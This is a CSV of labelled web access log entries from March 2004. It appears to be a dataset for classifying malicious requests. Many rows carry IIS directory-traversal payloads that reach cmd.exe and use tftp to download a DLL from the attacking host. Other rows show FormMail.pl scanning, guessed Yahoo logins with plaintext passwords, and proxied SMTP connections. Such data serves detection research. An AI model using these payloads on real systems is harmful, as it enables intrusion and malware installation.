,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
6090,68.48.36.59,10/Mar/2004:10:12:03 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
6091,68.48.36.59,10/Mar/2004:10:12:04 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
6092,68.48.7.157,10/Mar/2004:10:12:04 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6093,68.48.36.59,10/Mar/2004:10:12:04 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6094,68.82.168.149,10/Mar/2004:10:12:14 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [de]; Windows 95; athome020 ),n,0,/members/index.htm,0,without browser
6095,68.48.36.59,10/Mar/2004:10:12:14 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll,0,without browser
6096,68.48.36.59,10/Mar/2004:10:12:14 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
6097,68.48.36.59,10/Mar/2004:10:12:14 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
6098,68.48.36.59,10/Mar/2004:10:12:14 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
6099,212.160.136.163,10/Mar/2004:10:12:15 -0500,http://www.searchyourpockets.com/xml/?&aff_id=1546&str=home+loans ,200,566,"""http://www.bodybuilding.powerlifter.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT),n,0,/xml/,2,Microsoft Internet Explorer
6100,68.48.36.59,10/Mar/2004:10:12:19 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
6101,68.48.36.59,10/Mar/2004:10:12:19 -0500,/scripts/..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../httpodbc.dll,0,without browser
6102,68.48.36.59,10/Mar/2004:10:12:19 -0500,/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir ,400,305,"""-""",-,m,1,/scripts/..%c0%2f../winnt/system32/cmd.exe,0,without browser
6103,68.82.168.149,10/Mar/2004:10:12:19 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [en]; Windows 95; MSNIA ),n,0,/members/index.htm,0,without browser
6104,68.48.36.59,10/Mar/2004:10:12:22 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
6105,68.48.36.59,10/Mar/2004:10:12:22 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
6106,68.48.36.59,10/Mar/2004:10:12:22 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
6107,68.48.36.59,10/Mar/2004:10:12:23 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
6108,68.48.36.59,10/Mar/2004:10:12:24 -0500,/scripts/..%c0%af../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../httpodbc.dll,0,without browser
6109,208.190.202.194,10/Mar/2004:10:12:27 -0500,http://sbc2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=n_i_k_i_t_a_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6110,67.83.151.132,10/Mar/2004:10:12:33 -0500,http://www.bonefishadventure.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6111,203.121.182.142,10/Mar/2004:10:12:34 -0500,203.199.224.78:25 ,500,436,"""-""",-,n,0,203.199.224.78:25,0,without browser
6112,67.83.151.132,10/Mar/2004:10:12:34 -0500,http://www.anfm.com.au/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6113,68.48.36.59,10/Mar/2004:10:12:37 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
6114,68.48.36.59,10/Mar/2004:10:12:41 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
6115,68.48.36.59,10/Mar/2004:10:12:41 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
6116,68.48.36.59,10/Mar/2004:10:12:44 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
6117,68.48.36.59,10/Mar/2004:10:12:47 -0500,/scripts/..%c1%9c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../httpodbc.dll,0,without browser
6118,68.48.36.59,10/Mar/2004:10:12:47 -0500,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35%63../winnt/system32/cmd.exe,0,without browser
6119,68.48.36.59,10/Mar/2004:10:12:47 -0500,/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35c../winnt/system32/cmd.exe,0,without browser
6120,68.82.168.149,10/Mar/2004:10:12:48 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [dk]; Windows NT5.0; Compaq ),n,0,/members/index.htm,0,without browser
6121,68.82.168.149,10/Mar/2004:10:12:48 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows 98; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6122,67.83.151.132,10/Mar/2004:10:12:50 -0500,http://www.nicoladexter.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6123,68.48.7.157,10/Mar/2004:10:12:54 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6124,67.83.151.132,10/Mar/2004:10:13:00 -0500,http://www.eng.tau.ac.il/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6125,68.82.168.149,10/Mar/2004:10:13:04 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [de]; Windows 95; athome020 ),n,0,/members/index.htm,0,without browser
6126,68.82.168.149,10/Mar/2004:10:13:09 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [en]; Windows 95; MSNIA ),n,0,/members/index.htm,0,without browser
6127,203.121.182.139,10/Mar/2004:10:13:10 -0500,200.87.120.139:25 ,200,0,"""-""",-,n,0,200.87.120.139:25,0,without browser
6128,67.83.151.132,10/Mar/2004:10:13:11 -0500,http://www.delawareonline.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6129,192.117.242.67,10/Mar/2004:10:13:14 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6130,67.83.151.132,10/Mar/2004:10:13:23 -0500,http://www.loveme.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6131,208.190.202.194,10/Mar/2004:10:13:32 -0500,http://edit.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=nnej__&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6132,68.48.36.59,10/Mar/2004:10:13:38 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
6133,68.82.168.149,10/Mar/2004:10:13:38 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows 98; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6134,68.82.168.149,10/Mar/2004:10:13:38 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [dk]; Windows NT5.0; Compaq ),n,0,/members/index.htm,0,without browser
6135,217.208.64.55,10/Mar/2004:10:13:40 -0500,http://xxxkiki.com/members/ ,200,0,"""http://xxxkiki.com/members/""",Mozilla/4.73 ( compatible; [en]; Windows NT4.0; DigiExt ),n,0,/members/,0,without browser
6136,68.48.7.157,10/Mar/2004:10:13:45 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
6137,193.77.158.206,10/Mar/2004:10:13:53 -0500,http://www.athens-girls.com/members/index.html ,200,0,"""http://www.athens-girls.com/members/index.html""",Mozilla/4.0 ( compatible; [de]; Windows NT5.0; DigiExt ),n,0,/members/index.html,0,without browser
6138,193.77.158.206,10/Mar/2004:10:13:56 -0500,http://www.athens-girls.com/members/index.html ,200,0,"""http://www.athens-girls.com/members/index.html""",Mozilla/4.6 ( compatible; [fr]; Windows NT4.0; NetCaptor ),n,0,/members/index.html,0,without browser
6139,68.82.168.149,10/Mar/2004:10:13:58 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; [jp]; Windows XP; DigiExt ),n,0,/members/index.htm,0,without browser
6140,67.83.151.132,10/Mar/2004:10:14:02 -0500,http://www.loveme.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6141,67.83.151.132,10/Mar/2004:10:14:19 -0500,http://www.wmcclure.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6142,68.105.26.80,10/Mar/2004:10:14:20 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kitty_hm_2712&passwd=poop ,200,566,"""-""",-,n,0,/config/login,8,without browser
6143,203.121.182.140,10/Mar/2004:10:14:28 -0500,203.125.252.58:25 ,500,436,"""-""",-,n,0,203.125.252.58:25,0,without browser
6144,68.48.36.59,10/Mar/2004:10:14:28 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
6145,68.82.168.149,10/Mar/2004:10:14:32 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [jp]; Windows 98; NetCaptor ),n,0,/members/index.htm,0,without browser
6146,68.82.168.149,10/Mar/2004:10:14:32 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; [de]; Windows NT5.0; DigiExt ),n,0,/members/index.htm,0,without browser
6147,68.82.168.149,10/Mar/2004:10:14:32 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; athome020 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6148,192.117.242.67,10/Mar/2004:10:14:33 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6149,192.117.242.67,10/Mar/2004:10:14:33 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6150,68.48.7.157,10/Mar/2004:10:14:35 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6151,68.82.168.149,10/Mar/2004:10:14:35 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; ezn IE ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6152,208.190.202.194,10/Mar/2004:10:14:43 -0500,http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=osborne_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6153,68.82.168.149,10/Mar/2004:10:15:10 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; MSIE 5.5; Windows 95; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6154,144.139.175.209,10/Mar/2004:10:15:12 -0500,http://www.sun.com/ ,200,0,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
6155,212.160.136.163,10/Mar/2004:10:15:20 -0500,http://www.yoomy.com/Search1.php?ID=153&Q=travel&B3=Search ,300,0,"""http://www.power.lift.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/Search1.php,3,Microsoft Internet Explorer
6156,68.48.36.59,10/Mar/2004:10:15:22 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
6157,68.82.168.149,10/Mar/2004:10:15:22 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [jp]; Windows 98; NetCaptor ),n,0,/members/index.htm,0,without browser
6158,68.82.168.149,10/Mar/2004:10:15:22 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; [de]; Windows NT5.0; DigiExt ),n,0,/members/index.htm,0,without browser
6159,68.82.168.149,10/Mar/2004:10:15:22 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; athome020 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6160,68.48.7.157,10/Mar/2004:10:15:25 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6161,212.160.136.163,10/Mar/2004:10:15:25 -0500,http://www.yoomy.com/index.php?kd=45 ,200,9639,"""http://www.power.lift.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/index.php,1,Microsoft Internet Explorer
6162,68.82.168.149,10/Mar/2004:10:15:25 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; ezn IE ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6163,217.132.70.161,10/Mar/2004:10:15:28 -0500,http://members.germangoogirls.com/members/ ,200,0,"""-""",Mozilla/4.6 ( compatible; MSIE 5.01; Windows 95; TWRAITH ),n,0,/members/,0,Microsoft Internet Explorer
6164,217.132.70.161,10/Mar/2004:10:15:28 -0500,http://members.germangoogirls.com/members/ ,200,0,"""-""",Mozilla/4.6 ( compatible; [en]; Windows XP; DigiExt ),n,0,/members/,0,without browser
6165,212.160.136.163,10/Mar/2004:10:15:29 -0500,http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=computer+parts ,200,35123,"""http://www.powerlif.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/cgi-bin/search.cgi,2,Microsoft Internet Explorer
6166,61.237.215.17,10/Mar/2004:10:15:30 -0500,http://69.59.175.60/found-best.com/search.php ,500,531,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
6167,61.237.215.17,10/Mar/2004:10:15:31 -0500,http://69.59.175.60/found-best.com/search.php ,500,554,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
6168,61.237.215.17,10/Mar/2004:10:15:32 -0500,http://69.59.175.60/found-best.com/signup.php?referal=gu0000 ,500,585,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/found-best.com/signup.php,1,Microsoft Internet Explorer
6169,212.160.136.163,10/Mar/2004:10:15:32 -0500,http://www.helavasearch.com/cgi-bin/go.cgi?u=axzhhasczzhp&k=aczszoakzzsdahhhzyanzzhfafhx&url=fdahsospzhhnhkhxzvschyhpaxzchpsfzfhnacsvzfapzoxmzfsfxmzfsfcczdsfzmaxzshofsassofaazsoaczscxzdsfavsvzpzmfaazsosczzcxzdsfaozaxcamhhhxzmdyazsozhxcamhhzhzmdyazsozcxcamhhhxzydyazsofaazsoafzscxzdsfxvzdsfzvadcnamhhafayzhacscznaxapzahzaizsadscsshhaozdsvamzcaxasfaazsoschacxzdsfamzfahavzdaxanzfxcamhhhchpdyazsoznafakzzafavzdxcamhhzohsdyazsozfakanzzakxvzdsfhfsvcnamhhaxakzdazaazaxcamhhzvhadyazsozcxcamhhhxzodyazsozhxcamhhzhzodyazsoahzacmfaazsoahzzxmzfsfhiafxzaphhhozpsssvzyahzvhfachyzpafhkscapzozffdahsofdahsodkazsoadzszyshaphazmzzhfaksahnakazaizsacapssayhpayhcshzzhhhnznsphpzchxaihohxzczxaxshzxhzzczaahamznhhahsahazkzmzzhfaksaaizozazpadaizmspzvskshhxzoakhhzkzozaadadhozchczszoakhozksnzhzpsvapzmzmzzhfaksaanzsaaahayaizmspzvskaczszoakzzsdahhhzyanzzhfafhxahsnanzdadzazchkhyhnschkhnhyhozpsssvzyafhkhkadhhscsnhxhksvhxzcavsnsxzpzzzyaxhf&b=zsaaamzssvan&a=amundii&t=zxafakzsazaaznasanza&uid=2595056102 ,200,455,"""http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=computer+parts""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/cgi-bin/go.cgi,7,Microsoft Internet Explorer
6170,68.82.168.149,10/Mar/2004:10:15:42 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [dk]; Windows NT4.0; athome020 ),n,0,/members/index.htm,0,without browser
6171,208.190.202.194,10/Mar/2004:10:15:49 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=ottom_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6172,68.82.168.149,10/Mar/2004:10:16:00 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; MSIE 5.5; Windows 95; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6173,67.83.151.132,10/Mar/2004:10:16:05 -0500,http://www.saunalahti.fi/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6174,68.48.7.157,10/Mar/2004:10:16:17 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6175,68.82.168.149,10/Mar/2004:10:16:18 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; MSIE 4.0; Windows NT5.0; ezn IE ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6176,67.83.151.132,10/Mar/2004:10:16:36 -0500,http://www3.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6177,67.83.151.132,10/Mar/2004:10:16:38 -0500,http://www.applebees.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6178,67.83.151.132,10/Mar/2004:10:16:39 -0500,http://www.ooe-rodelverband.at/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6179,193.77.158.206,10/Mar/2004:10:16:44 -0500,http://www.athens-girls.com/members/index.html ,200,0,"""http://www.athens-girls.com/members/index.html""",Mozilla/4.0 ( compatible; [de]; Windows NT5.0; DigiExt ),n,0,/members/index.html,0,without browser
6180,193.77.158.206,10/Mar/2004:10:16:44 -0500,http://www.athens-girls.com/members/index.html ,200,0,"""http://www.athens-girls.com/members/index.html""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows NT5.0; MSNIA ),n,0,/members/index.html,0,Microsoft Internet Explorer
6181,193.77.158.206,10/Mar/2004:10:16:45 -0500,http://www.athens-girls.com/members/index.html ,200,0,"""http://www.athens-girls.com/members/index.html""",Mozilla/5.0 ( compatible; [en]; Windows NT4.0; DigiExt ),n,0,/members/index.html,0,without browser
